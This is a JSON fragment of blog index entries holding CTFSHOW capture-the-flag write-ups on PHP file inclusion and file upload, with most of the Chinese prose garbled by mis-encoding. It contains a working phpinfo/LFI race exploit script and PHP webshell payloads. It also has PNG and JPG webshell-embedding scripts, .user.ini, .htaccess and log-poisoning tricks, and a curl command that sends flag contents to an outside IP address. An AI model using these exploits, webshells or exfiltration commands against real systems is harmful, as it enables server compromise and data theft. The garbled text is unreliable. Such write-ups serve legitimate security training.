REQ1=\u0026#34;\u0026#34;\u0026#34;POST /06/phpinfo.php?a=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34; HTTP/1.1\\r 18Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 19HTTP_ACCEPT: \u0026#34;\u0026#34;\u0026#34; + padding + \u0026#34;\u0026#34;\u0026#34;\\r 20HTTP_USER_AGENT: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 21HTTP_ACCEPT_LANGUAGE: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 22HTTP_PRAGMA: \u0026#34;\u0026#34;\u0026#34;+padding+\u0026#34;\u0026#34;\u0026#34;\\r 23Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r 24Content-Length: %s\\r 25Host: %s\\r 26\\r 27%s\u0026#34;\u0026#34;\u0026#34; %(len(REQ1_DATA),host,REQ1_DATA) 28 #modify this to suit the LFI script 29 LFIREQ=\u0026#34;\u0026#34;\u0026#34;GET /06/lfi.php?file=%s HTTP/1.1\\r 30User-Agent: Mozilla/4.0\\r 31Proxy-Connection: Keep-Alive\\r 32Host: %s\\r 33\\r 34\\r 35\u0026#34;\u0026#34;\u0026#34; 36 return (REQ1, TAG, LFIREQ) 37 38def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): 39 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 40 s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 41 42 s.connect((host, port)) 43 s2.connect((host, port)) 44 45 s.send(phpinforeq) 46 d = \u0026#34;\u0026#34; 47 while len(d) \u0026lt; offset: 48 d += s.recv(offset) 49 try: 50 i = d.index(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 51 fn = d[i+17:i+31] 52 except ValueError: 53 return None 54 55 s2.send(lfireq % (fn, host)) 56 d = s2.recv(4096) 57 s.close() 58 s2.close() 59 60 if d.find(tag) != -1: 61 return fn 62 63counter=0 64class ThreadWorker(threading.Thread): 65 def __init__(self, e, l, m, *args): 66 threading.Thread.__init__(self) 67 self.event = e 68 self.lock = l 69 self.maxattempts = m 70 self.args = args 71 72 def run(self): 73 global counter 74 while not self.event.is_set(): 75 with self.lock: 76 if counter \u0026gt;= self.maxattempts: 77 return 78 counter+=1 79 80 try: 81 x = phpInfoLFI(*self.args) 82 if self.event.is_set(): 83 break 84 if x: 85 print \u0026#34;\\nGot it! Shell created in /tmp/g\u0026#34; 86 self.event.set() 87 88 except socket.error: 89 return 90 91 92def getOffset(host, port, phpinforeq): 93 \u0026#34;\u0026#34;\u0026#34;Gets offset of tmp_name in the php output\u0026#34;\u0026#34;\u0026#34; 94 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 95 s.connect((host,port)) 96 s.send(phpinforeq) 97 98 d = \u0026#34;\u0026#34; 99 while True: 100 i = s.recv(4096) 101 d+=i 102 if i == \u0026#34;\u0026#34;: 103 break 104 # detect the final chunk 105 if i.endswith(\u0026#34;0\\r\\n\\r\\n\u0026#34;): 106 break 107 s.close() 108 i = d.find(\u0026#34;[tmp_name] =\u0026amp;gt; \u0026#34;) 109 if i == -1: 110 raise ValueError(\u0026#34;No php tmp_name in phpinfo output\u0026#34;) 111 112 print \u0026#34;found %s at %i\u0026#34; % (d[i:i+10],i) 113 # padded up a bit 114 return i+256 115 116def main(): 117 118 print \u0026#34;LFI With PHPInfo()\u0026#34; 119 print \u0026#34;-=\u0026#34; * 30 120 121 if len(sys.argv) \u0026lt; 2: 122 print \u0026#34;Usage: %s host [port] [threads]\u0026#34; % sys.argv[0] 123 sys.exit(1) 124 125 try: 126 host = socket.gethostbyname(sys.argv[1]) 127 except socket.error, e: 128 print \u0026#34;Error with hostname %s: %s\u0026#34; % (sys.argv[1], e) 129 sys.exit(1) 130 131 port=80 132 try: 133 port = int(sys.argv[2]) 134 except IndexError: 135 pass 136 except ValueError, e: 137 print \u0026#34;Error with port %d: %s\u0026#34; % (sys.argv[2], e) 138 sys.exit(1) 139 140 poolsz=10 141 try: 142 poolsz = int(sys.argv[3]) 143 except IndexError: 144 pass 145 except ValueError, e: 146 print \u0026#34;Error with poolsz %d: %s\u0026#34; % (sys.argv[3], e) 147 sys.exit(1) 148 149 print \u0026#34;Getting initial offset...\u0026#34;, 150 reqphp, tag, reqlfi = setup(host, port) 151 offset = getOffset(host, port, reqphp) 152 sys.stdout.flush() 153 154 maxattempts = 1000 155 e = threading.Event() 156 l = threading.Lock() 157 158 print \u0026#34;Spawning worker pool (%d)...\u0026#34; % poolsz 159 sys.stdout.flush() 160 161 tp = [] 162 for i in range(0,poolsz): 163 tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) 164 165 for t in tp: 166 t.start() 167 try: 168 while not e.wait(1): 169 if e.is_set(): 170 break 171 with l: 172 sys.stdout.write( \u0026#34;\\r% 4d / % 4d\u0026#34; % (counter, maxattempts)) 173 sys.stdout.flush() 174 if counter \u0026gt;= maxattempts: 175 break 176 print 177 if e.is_set(): 178 print \u0026#34;Woot! \\m/\u0026#34; 179 else: 180 print \u0026#34;:(\u0026#34; 181 except KeyboardInterrupt: 182 print \u0026#34;\\nTelling threads to shutdown...\u0026#34; 183 e.set() 184 185 print \u0026#34;Shuttin\u0026#39; down...\u0026#34; 186 for t in tp: 187 t.join() 188 189if __name__==\u0026#34;__main__\u0026#34;: 190 main() ","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","summary":"\u003cblockquote\u003e\n\u003cp\u003eä»¥PHPä¸ºä¾‹,å¸¸ç”¨çš„æ–‡ä»¶åŒ…å«å‡½æ•°æœ‰ä»¥ä¸‹å››ç§include(),require(),include_once(),require_once()\u003c/p\u003e\u003c/blockquote\u003e\n\u003ch4 id=\"web78\"\u003eWeb78\u003c/h4\u003e\n\u003cp\u003ephpä¼ªåè®®\u003c/p\u003e","title":"CTFSHOW-æ–‡ä»¶åŒ…å«-Writeup"},{"content":"web151 å‰å°éªŒè¯\nå°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆpngï¼ŒæŠ“åŒ…ä¿®æ”¹åç¼€å³å¯\npayload:\n1=system(\u0026#39;cat /var/www/html/flag.php\u0026#39;); web152 è¿™é“é¢˜æ²¡æœ‰å‰ç«¯æ£€éªŒï¼Œä½†æ˜¯è§£æ³•è·Ÿweb151æ˜¯ä¸€æ ·çš„\nweb153 ä¸€å¼€å§‹å°è¯•äº†å¤§å°å†™ç»•è¿‡\nä¸Šä¼ åå‘ç°æœåŠ¡å™¨ä¸è§£æ\nè¿™é¢˜å¯ä»¥åˆ©ç”¨.user.iniæ¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ \n[æ–‡ä»¶ä¸Šä¼ ]æµ…æ.user.iniçš„åˆ©ç”¨-CSDNåšå®¢\né¦–å…ˆæˆ‘ä»¬åœ¨æ–‡ä»¶ä¸­å†™å…¥\nè¿™å¥è¯ç›¸å½“äºphpä¸­çš„æ–‡ä»¶åŒ…å«\nå†™å…¥åå°†æ–‡ä»¶æ”¹ä¸ºpngä¸Šä¼ ï¼ŒæŠ“åŒ…å°†æ–‡ä»¶åæ”¹ä¸º.user.ini\næ¥ç€å°†ä¸€å¥è¯æœ¨é©¬æ”¹ä¸º1.pngä¸Šä¼ \næ¥ç€è®¿é—® /upload/index.php\npayload:\n1=system(\u0026#39;tac ../f*\u0026#39;); æ³¨æ„è¿™ä¸ªæ–¹æ³•çš„å‰ææ˜¯æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ä¸­æœ‰èƒ½å¤Ÿæ‰§è¡Œçš„phpçš„æ–‡ä»¶ï¼ˆå¦‚index.phpï¼‰\nweb154 è¿™é¢˜è·Ÿä¸Šé¢˜å·®ä¸å¤šï¼Œåªæ˜¯è¿‡æ»¤äº†php\nå°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆçŸ­æ ‡ç­¾çš„å½¢å¼å°±å¯ä»¥äº†ï¼ˆæˆ‘ä¸€ç›´ç”¨çš„çŸ­æ ‡ç­¾æ‰€ä»¥æ²¡ä»€ä¹ˆå½±å“ï¼‰\nweb155 è§£æ³•åŒweb154ä¸€æ ·\nweb156 è¿™é¢˜æœ‰æ–°çš„waf,å¯ä»¥æµ‹å‡ºæ¥wafæ‰äº†[]\né‚£æ—¢ç„¶è¿™æ ·æˆ‘ä»¬ç›´æ¥è¯»flagå°±æ˜¯äº†\n\u0026lt;?=system(\u0026#39;cat ../f*\u0026#39;);?\u0026gt; æˆ–è€…ä¹Ÿå¯ä»¥ç”¨{}ä»£æ›¿[\u0026rsquo;']\n\u0026lt;?=@eval($_GET{1});?\u0026gt; web157 è¿™é“é¢˜[]å’Œ;éƒ½è¢«wafäº†\npayload:\n\u0026lt;?=system(\u0026#34;tac ../f*\u0026#34;)?\u0026gt; ä¸å†™;å°±è¡Œäº†\nweb158 è¿™é¢˜å’Œä¸Šé¢˜çš„è§£æ³•ä¸€æ ·\nweb159 è¿™é¢˜wafæ‰äº†()\næ²¡æœ‰()æ€ä¹ˆè¿›è¡Œrceå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æƒ³åˆ°``è¿›è¡Œå‘½ä»¤æ‰§è¡Œçš„æŠ€å·§\npayload:\n\u0026lt;?=`tac ../f*`?\u0026gt; web160 ä¸€å¼€å§‹å‘ç°.user.iniç©¿ä¸ä¸Šï¼Œåé¢æµ‹åˆ°åŸæ¥æ˜¯ç©ºæ ¼è¢«wafäº†ï¼Œ.user.inié‡Œä¹Ÿä¸èƒ½æœ‰ç©ºæ ¼\nç›¸æ¯”ä¸Šä¸€é¢˜è¿™é¢˜å°†ç©ºæ ¼å’Œ``åå¼•å·å’Œlogè¿‡æ»¤æ‰äº†\nè¿™é¢˜æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨æ—¥å¿—æ³¨å…¥çš„æ–¹æ³•\nå°è¯•ä¸€ä¸‹åŒ…å«æ—¥å¿— nginxçš„logåœ¨/var/log/nginx/access.log\npayload:\n\u0026lt;?=include\u0026#34;/var/l\u0026#34;.\u0026#34;og/nginx/access.l\u0026#34;.\u0026#34;og\u0026#34;?\u0026gt; çœ‹åˆ°æœ‰user-agentè¯´æ˜è¿™æ¡è·¯è¡Œå¾—é€š\nç›´æ¥è¯»flag\nweb161 è¿™ä¸€é¢˜åœ¨ä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Šå¢åŠ äº†æ–‡ä»¶å¤´çš„æ£€éªŒ\næˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™åŠ ä¸Šå›¾ç‰‡çš„æ–‡ä»¶å¤´GIF89aè¿›è¡Œç»•è¿‡\nå…¶ä½™å’Œweb160æ— å¼‚ï¼Œåˆ©ç”¨æ–‡ä»¶åŒ…å«è¿›è¡Œæ—¥å¿—æ³¨å…¥å³å¯\nweb162 fuzzä¸€ä¸‹å¯ä»¥å‘ç°è¿™é¢˜æŠŠ.ä¹Ÿbanæ‰äº†\næ‰€ä»¥æˆ‘ä»¬åœ¨ä¸Šä¼ çš„.user.iniæ—¶æˆ‘ä»¬å¯ä»¥å»æ‰æ–‡ä»¶åç¼€\nGIF89a\rauto_prepend_file=1 æ¥ä¸‹æ¥è€ƒè™‘æ€ä¹ˆæ„é€ è¯»flag\nå¯ä»¥é€šè¿‡å–åç»•è¿‡.çš„è¿‡æ»¤ï¼Œè¿›è¡Œæ–‡ä»¶åŒ…å«\n\u0026lt;?=$a=\u0026#34;Ã‘\u0026#34;?\u0026gt; \u0026lt;?=$b=~$a?\u0026gt;\r\u0026lt;?=$l=\u0026#34;l\u0026#34;?\u0026gt;\r\u0026lt;?=$o=\u0026#34;o\u0026#34;?\u0026gt;\r\u0026lt;?=$g=\u0026#34;g\u0026#34;?\u0026gt;\r\u0026lt;?=include\u0026#34;/var/$l$o$g/nginx/access$b$l$o$g\u0026#34;?\u0026gt; æ–‡ä»¶ 1 ä¸­çš„å†…å®¹ ä¸‹é¢çš„Ã‘ ä¸º . å–ååçš„å­—ç¬¦ åå…­è¿›åˆ¶ä¸º D1ï¼Œåˆ©ç”¨çš„æ—¶å€™ï¼Œåœ¨brup ä¸­æ›´æ”¹hexé‡Œçš„å€¼ã€‚\næ—¥å¿—æ³¨å…¥å³å¯\nweb163 è¿™é¢˜å’Œä¸Šé¢˜çš„æ¡ä»¶å·®ä¸å¤šï¼Œä½†æ˜¯å­˜åœ¨ç«äº‰æ¡ä»¶ï¼Œä¸Šä¼ å›¾ç‰‡çš„è¯ä¼šè¢«åˆ æ‰\nè¿™é¢˜æˆ‘ä»¬å°è¯•ä½¿ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«\næˆ‘ä»¬æŠŠpayloadå†™åœ¨æœåŠ¡å™¨ä¸Šï¼Œç„¶åèµ·ä¸€ä¸ªhttpæœåŠ¡\nè®°ä½ï¼Œæ–‡ä»¶åŒ…å«æ—¶è¦æŠŠipè½¬æ¢æˆé•¿æ•´å‹ï¼ˆ.è¢«wafäº†ï¼‰\nGIF89a\rauto_prepend_file=http://é•¿æ•´å‹ip:7777/s ä¼ .user.ini\næ¥ç€æ“ä¸€ä¸ªå‘åŒ…è„šæœ¬\n1import requests 2 3while True: 4 burp0_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/\u0026#34; 5 burp1_url = \u0026#34;http://3de6e682-59e3-489c-8e72-2b74e3db5058.challenge.ctf.show/upload/\u0026#34; 6 burp0_headers = {\u0026#34;Sec-Ch-Ua-Platform\u0026#34;: \u0026#34;\\\u0026#34;Windows\\\u0026#34;\u0026#34;, \u0026#34;Accept-Language\u0026#34;: \u0026#34;zh-CN,zh;q=0.9\u0026#34;, \u0026#34;Sec-Ch-Ua\u0026#34;: \u0026#34;\\\u0026#34;Not?A_Brand\\\u0026#34;;v=\\\u0026#34;99\\\u0026#34;, \\\u0026#34;Chromium\\\u0026#34;;v=\\\u0026#34;130\\\u0026#34;\u0026#34;, \u0026#34;Sec-Ch-Ua-Mobile\u0026#34;: \u0026#34;?0\u0026#34;, \u0026#34;X-Requested-With\u0026#34;: \u0026#34;XMLHttpRequest\u0026#34;, \u0026#34;User-Agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36\u0026#34;, \u0026#34;Accept\u0026#34;: \u0026#34;application/json, text/javascript, */*; q=0.01\u0026#34;, \u0026#34;Content-Type\u0026#34;: \u0026#34;multipart/form-data; boundary=----WebKitFormBoundaryBcDoqZWhQP52WEA6\u0026#34;, \u0026#34;Origin\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show\u0026#34;, \u0026#34;Sec-Fetch-Site\u0026#34;: \u0026#34;same-origin\u0026#34;, \u0026#34;Sec-Fetch-Mode\u0026#34;: \u0026#34;cors\u0026#34;, \u0026#34;Sec-Fetch-Dest\u0026#34;: \u0026#34;empty\u0026#34;, \u0026#34;Referer\u0026#34;: \u0026#34;https://938b9a73-97ad-4b15-81d8-0101678e16f8.challenge.ctf.show/\u0026#34;, \u0026#34;Accept-Encoding\u0026#34;: \u0026#34;gzip, deflate, br\u0026#34;, \u0026#34;Priority\u0026#34;: \u0026#34;u=1, i\u0026#34;, \u0026#34;Connection\u0026#34;: \u0026#34;keep-alive\u0026#34;} 7 burp0_data = \u0026#34;------WebKitFormBoundaryBcDoqZWhQP52WEA6\\r\\nContent-Disposition: form-data; name=\\\u0026#34;file\\\u0026#34;; filename=\\\u0026#34;.user.ini\\\u0026#34;\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF89a\\r\\nauto_prepend_file=http://é•¿æ•´å‹ip:7777/shell\\r\\n------WebKitFormBoundaryBcDoqZWhQP52WEA6--\\r\\n\u0026#34; 8 log = requests.post(burp0_url, headers=burp0_headers, data=burp0_data) 9 log1 = requests.get(burp1_url) 10 print(log.status_code) 11 print(\u0026#39;\\n\u0026#39;) 12 print(log1.text) 13 if \u0026#34;ctfshow\u0026#34; in log1.text: 14 print(\u0026#39;getflag\u0026#39;) 15 break web164 è¿™é¢˜éšä¾¿ä¼ ä¸ªå›¾ç‰‡è¯•è¯•å‘ç°å¤šäº†ä¸ªæŸ¥çœ‹å›¾ç‰‡\nhttps://775e9cd3-3a73-47a1-b31d-7b4450ec5573.challenge.ctf.show/download.php?image=94f7678cc4cda39c02c7890bc8fe6941.png ä»urlæˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™é¢˜å­˜åœ¨å›¾ç‰‡åŒ…å«\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶åŒ…å«å»æ‰§è¡Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬\nå¤§ä½¬çš„è„šæœ¬ï¼Œå¯ä»¥ç»•è¿‡äºŒæ¬¡æ¸²æŸ“\n1\u0026lt;?php 2$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 3 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 4 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 5 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 6 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 7 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 8 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 9 0x66, 0x44, 0x50, 0x33); 10 11 12 13$img = imagecreatetruecolor(32, 32); 14 15for ($y = 0; $y \u0026lt; sizeof($p); $y += 3) { 16 $r = $p[$y]; 17 $g = $p[$y+1]; 18 $b = $p[$y+2]; 19 $color = imagecolorallocate($img, $r, $g, $b); 20 imagesetpixel($img, round($y / 3), 0, $color); 21} 22 23imagepng($img,\u0026#39;./1.png\u0026#39;); 24?\u0026gt; å›¾ç‰‡é©¬çš„å†…å®¹ \u0026lt;?$_GET[0]($_POST[1]);?\u0026gt; æ²¡æœ‰å›æ˜¾\nå¤–å¸¦è¯»flag\nPOST 1=cat f* | curl -X POST -d @- http://106.55.168.231:7777/\rGET 0=system web165 è¿™é¢˜è€ƒå¯Ÿçš„ä¹Ÿæ˜¯å›¾ç‰‡é©¬ï¼Œä½†æ˜¯æ˜¯ç”¨jpgçš„å›¾ç‰‡é©¬ç»•è¿‡äºŒæ¬¡æ¸²æŸ“\nå¤§ä½¬çš„è„šæœ¬\n1\u0026lt;?php 2 /* 3 4 The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). 5 It is necessary that the size and quality of the initial image are the same as those of the processed image. 6 7 1) Upload an arbitrary image via secured files upload script 8 2) Save the processed image and launch: 9 jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt; 10 11 In case of successful injection you will get a specially crafted image, which should be uploaded again. 12 13 Since the most straightforward injection method is used, the following problems can occur: 14 1) After the second processing the injected data may become partially corrupted. 15 2) The jpg_payload.php script outputs \u0026#34;Something\u0026#39;s wrong\u0026#34;. 16 If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. 17 18 Sergey Bobrov @Black2Fan. 19 20 See also: 21 https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ 22 23 */ 24\t25 $miniPayload = \u0026#34;\u0026lt;?=eval(\\$_POST[7]);?\u0026gt;\u0026#34;; //æ³¨æ„$è½¬ä¹‰ 26 27 28 if(!extension_loaded(\u0026#39;gd\u0026#39;) || !function_exists(\u0026#39;imagecreatefromjpeg\u0026#39;)) { 29 die(\u0026#39;php-gd is not installed\u0026#39;); 30 } 31 32 if(!isset($argv[1])) { 33 die(\u0026#39;php jpg_payload.php \u0026lt;jpg_name.jpg\u0026gt;\u0026#39;); 34 } 35 36 set_error_handler(\u0026#34;custom_error_handler\u0026#34;); 37 38 for($pad = 0; $pad \u0026lt; 1024; $pad++) { 39 $nullbytePayloadSize = $pad; 40 $dis = new DataInputStream($argv[1]); 41 $outStream = file_get_contents($argv[1]); 42 $extraBytes = 0; 43 $correctImage = TRUE; 44 45 if($dis-\u0026gt;readShort() != 0xFFD8) { 46 die(\u0026#39;Incorrect SOI marker\u0026#39;); 47 } 48 49 while((!$dis-\u0026gt;eof()) \u0026amp;\u0026amp; ($dis-\u0026gt;readByte() == 0xFF)) { 50 $marker = $dis-\u0026gt;readByte(); 51 $size = $dis-\u0026gt;readShort() - 2; 52 $dis-\u0026gt;skip($size); 53 if($marker === 0xDA) { 54 $startPos = $dis-\u0026gt;seek(); 55 $outStreamTmp = 56 substr($outStream, 0, $startPos) . 57 $miniPayload . 58 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize) . 59 substr($outStream, $startPos); 60 checkImage(\u0026#39;_\u0026#39;.$argv[1], $outStreamTmp, TRUE); 61 if($extraBytes !== 0) { 62 while((!$dis-\u0026gt;eof())) { 63 if($dis-\u0026gt;readByte() === 0xFF) { 64 if($dis-\u0026gt;readByte !== 0x00) { 65 break; 66 } 67 } 68 } 69 $stopPos = $dis-\u0026gt;seek() - 2; 70 $imageStreamSize = $stopPos - $startPos; 71 $outStream = 72 substr($outStream, 0, $startPos) . 73 $miniPayload . 74 substr( 75 str_repeat(\u0026#34;\\0\u0026#34;,$nullbytePayloadSize). 76 substr($outStream, $startPos, $imageStreamSize), 77 0, 78 $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 79 substr($outStream, $stopPos); 80 } elseif($correctImage) { 81 $outStream = $outStreamTmp; 82 } else { 83 break; 84 } 85 if(checkImage(\u0026#39;payload_\u0026#39;.$argv[1], $outStream)) { 86 die(\u0026#39;Success!\u0026#39;); 87 } else { 88 break; 89 } 90 } 91 } 92 } 93 unlink(\u0026#39;payload_\u0026#39;.$argv[1]); 94 die(\u0026#39;Something\\\u0026#39;s wrong\u0026#39;); 95 96 function checkImage($filename, $data, $unlink = FALSE) { 97 global $correctImage; 98 file_put_contents($filename, $data); 99 $correctImage = TRUE; 100 imagecreatefromjpeg($filename); 101 if($unlink) 102 unlink($filename); 103 return $correctImage; 104 } 105 106 function custom_error_handler($errno, $errstr, $errfile, $errline) { 107 global $extraBytes, $correctImage; 108 $correctImage = FALSE; 109 if(preg_match(\u0026#39;/(\\d+) extraneous bytes before marker/\u0026#39;, $errstr, $m)) { 110 if(isset($m[1])) { 111 $extraBytes = (int)$m[1]; 112 } 113 } 114 } 115 116 class DataInputStream { 117 private $binData; 118 private $order; 119 private $size; 120 121 public function __construct($filename, $order = false, $fromString = false) { 122 $this-\u0026gt;binData = \u0026#39;\u0026#39;; 123 $this-\u0026gt;order = $order; 124 if(!$fromString) { 125 if(!file_exists($filename) || !is_file($filename)) 126 die(\u0026#39;File not exists [\u0026#39;.$filename.\u0026#39;]\u0026#39;); 127 $this-\u0026gt;binData = file_get_contents($filename); 128 } else { 129 $this-\u0026gt;binData = $filename; 130 } 131 $this-\u0026gt;size = strlen($this-\u0026gt;binData); 132 } 133 134 public function seek() { 135 return ($this-\u0026gt;size - strlen($this-\u0026gt;binData)); 136 } 137 138 public function skip($skip) { 139 $this-\u0026gt;binData = substr($this-\u0026gt;binData, $skip); 140 } 141 142 public function readByte() { 143 if($this-\u0026gt;eof()) { 144 die(\u0026#39;End Of File\u0026#39;); 145 } 146 $byte = substr($this-\u0026gt;binData, 0, 1); 147 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 1); 148 return ord($byte); 149 } 150 151 public function readShort() { 152 if(strlen($this-\u0026gt;binData) \u0026lt; 2) { 153 die(\u0026#39;End Of File\u0026#39;); 154 } 155 $short = substr($this-\u0026gt;binData, 0, 2); 156 $this-\u0026gt;binData = substr($this-\u0026gt;binData, 2); 157 if($this-\u0026gt;order) { 158 $short = (ord($short[1]) \u0026lt;\u0026lt; 8) + ord($short[0]); 159 } else { 160 $short = (ord($short[0]) \u0026lt;\u0026lt; 8) + ord($short[1]); 161 } 162 return $short; 163 } 164 165 public function eof() { 166 return !$this-\u0026gt;binData||(strlen($this-\u0026gt;binData) === 0); 167 } 168 } 169?\u0026gt; jpgå›¾ç‰‡æ¯”è¾ƒè„†å¼±ï¼ŒæˆåŠŸç‡å¾ˆä½ï¼Œæˆ‘è¯•äº†åå¤šå¼ å›¾ç‰‡éƒ½æ²¡æˆåŠŸ\nweb166 zipæ³¨å…¥\nè¿™é¢˜åªèƒ½ä¸Šä¼ zipï¼Œä¸Šä¼ åä¼šå‡ºç°æŸ¥çœ‹æ–‡ä»¶ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«\næœ¬è´¨ä¸Šå°±æ˜¯åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç \nweb167 .htaccessæ–‡ä»¶åˆ©ç”¨\nä»€ä¹ˆæ˜¯.htaccessï¼Ÿ\nhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚\nå¦‚æœæœåŠ¡å™¨å¼€å¯äº†.htaccessï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨.htaccesså°†jpgæˆ–è€…pngç­‰åç¼€çš„æ–‡ä»¶ï¼Œä½œä¸ºphpæ–‡ä»¶è§£æ\nAddType/AddHandler application/x-httpd-php \u0026#34;.jpg\u0026#34; ç”±äºæœ‰å‰ç«¯éªŒè¯ï¼Œæˆ‘ä»¬è¦å…ˆæŠŠç¼–å†™å¥½çš„.htaccessæ–‡ä»¶æ”¹ä¸º.jpgåç¼€\nå†é€šè¿‡æŠ“åŒ…å°†æ–‡ä»¶åä¿®æ”¹ä¸º.htaccess\næ¥ç€ä¸Šä¼ æˆ‘ä»¬å†™å¥½çš„ä¸€å¥è¯æœ¨é©¬(åç¼€ä¸º.jpg)\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ä¸€å¥è¯æœ¨é©¬å·²ç»è¢«æˆåŠŸæ‰§è¡Œäº†\nweb168 åŸºç¡€å…æ€\nè¿™é¢˜æ²¡æœ‰é™åˆ¶æ–‡ä»¶ç±»å‹ï¼Œå¯ä»¥ä¸Šä¼ php\nåº”è¯¥æ˜¯å¯¹å…³é”®è¯æœ‰è¿‡æ»¤\nç®€å•æ‹¼æ¥ä¸€ä¸‹è¯•è¯•ï¼Œæ²¡æƒ³åˆ°ç›´æ¥æˆåŠŸäº†\npayload\n\u0026lt;?php $a=\u0026#34;sys\u0026#34;.\u0026#34;tem\u0026#34;; $a($_REQUEST[1]);? GET 1=tac%20../flagaa.php web169 .user.iniæ–‡ä»¶åŒ…å«\nå‰ç«¯åšäº†æ ¡éªŒåªèƒ½ä¼ zipæ–‡ä»¶,åç«¯åˆåšäº†å›¾ç‰‡æ–‡ä»¶æ£€æŸ¥(éœ€è¦æ”¹æˆimage/png).è¿‡æ»¤äº†\u0026lt;\u0026gt;å’Œphp\nå…ˆä¸Šä¼ ä¸€ä¸ªindex.phpï¼Œç„¶ååˆ©ç”¨æ—¥å¿—åŒ…å«ï¼Œä¸Šä¼ .user.ini å†™å…¥ä»¥ä¸‹å†…å®¹è¿›è¡ŒåŒ…å«ç„¶åUAé‡Œé¢å†™æœ¨é©¬\nauto_append_file=\u0026#34;/var/log/nginx/access.log\u0026#34;\r\u0026lt;?=system(\u0026#39;cat ../flagaa.php\u0026#39;)?\u0026gt; web170 è¿™é¢˜å’Œweb169è§£æ³•ä¸€æ ·ï¼Œä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ—¥å¿—åŒ…å«\n","permalink":"http://localhost:1313/post/ctfshow/ctfshow_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","summary":"\u003ch4 id=\"web151\"\u003eweb151\u003c/h4\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126161249975\" loading=\"lazy\" src=\"../assets/image-20250126161249975.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå‰å°éªŒè¯\u003c/p\u003e\n\u003cp\u003eå°†ä¸€å¥è¯æœ¨é©¬æ”¹æˆpngï¼ŒæŠ“åŒ…ä¿®æ”¹åç¼€å³å¯\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250126162045356\" loading=\"lazy\" src=\"../assets/image-20250126162045356.png\"\u003e\u003c/p\u003e\n\u003cp\u003epayload:\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1=system(\u0026#39;cat 